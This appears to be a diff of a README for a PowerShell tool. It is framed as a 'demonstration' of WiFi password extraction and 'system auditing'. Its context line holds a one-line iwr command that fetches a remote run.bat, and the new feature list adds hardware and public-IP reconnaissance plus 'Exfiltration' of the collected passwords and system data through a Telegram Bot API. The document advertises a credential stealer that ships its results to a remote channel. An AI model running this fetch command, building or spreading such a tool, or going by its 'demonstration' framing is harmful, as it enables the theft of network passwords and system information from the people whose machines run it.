@@ -51,14 +51,25 @@ iwr https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/main/run.bat -OutF
 
 ---
 
-## 📋 What This Tool Does
+## 📋 What This Tool Does (v2.0.0)
 
-This PowerShell script demonstrates WiFi password extraction techniques by:
+This PowerShell script demonstrates advanced system auditing and data extraction techniques by:
 
-- 🔍 Extracting saved WiFi profiles from Windows
-- 📄 Displaying stored network passwords
-- 💾 Exporting results to text file
-- 🎨 Providing a colorful terminal interface
+- 🔍 **WiFi Extraction**: Recovers saved WiFi profiles and cleartext passwords.
+- 💻 **Hardware Recon**: Captures CPU, RAM (GB), GPU, and Model information.
+- 🌐 **Network Discovery**: Identifies the Public IP address of the system.
+- 📄 **System Details**: Records OS version, architecture, and timestamp.
+- 💾 **Exfiltration**: Demonstrates secure data delivery via Telegram Bot API.
+- 🎨 **Enhanced UI**: Features a cleaner, color-coded terminal interface.
+
+---
+
+## 🚀 New in v2.0.0
+
+- **Modular Design**: Functions are now separated for better readability and maintenance.
+- **Detailed Reporting**: The output report is now more structured and professional.
+- **Advanced Diagnostics**: Added Public IP and Hardware specs (RAM, GPU).
+- **Improved Error Handling**: Better management of network timeouts and admin checks.
 
 ---
 
